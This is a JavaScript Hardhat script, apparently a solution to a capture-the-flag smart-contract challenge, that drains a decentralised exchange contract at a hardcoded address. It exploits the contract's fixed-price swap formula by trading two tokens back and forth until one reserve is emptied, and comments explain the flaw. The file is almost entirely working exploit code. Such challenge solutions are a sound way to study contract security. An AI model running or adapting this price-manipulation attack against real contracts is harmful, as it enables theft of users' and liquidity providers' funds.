const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x8E511d028ACf8f7f147e4cE80742c6db42902909'
const abi = [
    "function approve(address spender, uint amount) public",
    "function swap(address from, address to, uint amount) public",
    "function token1() public view returns (address)",
    "function token2() public view returns (address)",
    "function balanceOf(address token, address account) public view returns (uint)"
]

async function hack(contract, signer) {
    let balances = { token1: 10, token2: 10 }
    const token1Contract = await contract.token1()
    const token2Contract = await contract.token2()

    // Approve contract for full supply (110) of each token, to get it over with.
    const approveTx = await contract.approve(contract.address, 110);
    await approveTx.wait();
    console.log('Tokens approved for trading.')

    // // The contract doesn't update prices along a curve, it just quotes a fixed price and lets you buy unlimited at that price.
    // // This means that, when trading a token the DEX has less of, it will overvalue it and overcompensate you in other token.
    // // So we can "swing" back and forth getting greater and greater returns, until we wipe one out.

    while (balances.token1 != 110 && balances.token2 != 110){
        let higherToken = balances.token1 >= balances.token2 ? 
            { contract: token1Contract, balance: balances.token1 } : 
            { contract: token2Contract, balance: balances.token2 };
        
        let lowerToken = balances.token1 < balances.token2 ? 
            { contract: token1Contract, balance: balances.token1 } : 
            { contract: token2Contract, balance: balances.token2 };
        
        let amountToBeReceived = Math.floor(higherToken.balance * (110 - lowerToken.balance) / (110 - higherToken.balance));
        let tx;

        if (amountToBeReceived < (110 - lowerToken.balance)) {
            console.log(`Swapping ${higherToken.balance} ${higherToken.contract} for ${amountToBeReceived} ${lowerToken.contract}`)
            tx = await contract.swap(higherToken.contract, lowerToken.contract, higherToken.balance)
        } else {
            let amountToSwap = Math.ceil(110 / (110 / (110 - higherToken.balance)));
            console.log(`Swapping ${amountToSwap} ${higherToken.contract} for 110 ${lowerToken.contract}`)
            tx = await contract.swap(higherToken.contract, lowerToken.contract, amountToSwap)
        }
        await tx.wait();

        balances.token1 = parseInt(await contract.balanceOf(await contract.token1(), signer.address))
        balances.token2 = parseInt(await contract.balanceOf(await contract.token2(), signer.address))
        
        console.log('Swap Completed.')
        console.log('Your Balances || Token 1: ' + balances.token1 + ' || Token 2: ' + balances.token2)
        console.log('DEX Balances || Token 1: ' + (110 - balances.token1) + ' || Token 2: ' + (110 - balances.token2))
    }
    console.log('DEX = REKT')
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})